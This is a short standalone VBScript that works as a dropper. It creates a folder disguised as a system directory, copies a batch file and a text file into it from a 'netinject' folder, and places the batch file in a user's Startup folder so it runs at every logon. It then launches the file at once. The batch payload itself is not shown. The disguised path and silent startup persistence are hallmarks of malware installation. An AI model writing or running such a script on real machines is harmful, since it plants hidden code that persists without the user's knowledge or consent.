set crt = CreateObject("wscript.shell")
set x = CreateObject("Scripting.FileSystemObject")
set exe = CreateObject("Shell.Application")
crt.Run "cmd /c mkdir c:\SysFunctions\Functionx32"
WScript.Sleep(400)
x.CopyFile "D:\netinject\pica.bat", "C:\SysFunctions\Functionx32\"
x.CopyFile "D:\netinject\functions.txt", "C:\SysFunctions\Functionx32\"
x.CopyFile "C:\SysFunctions\Functionx32\pica.bat", "C:\Users\yulus\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"
WScript.Sleep(400)
exe.ShellExecute("C:\SysFunctions\Functionx32\pica.bat")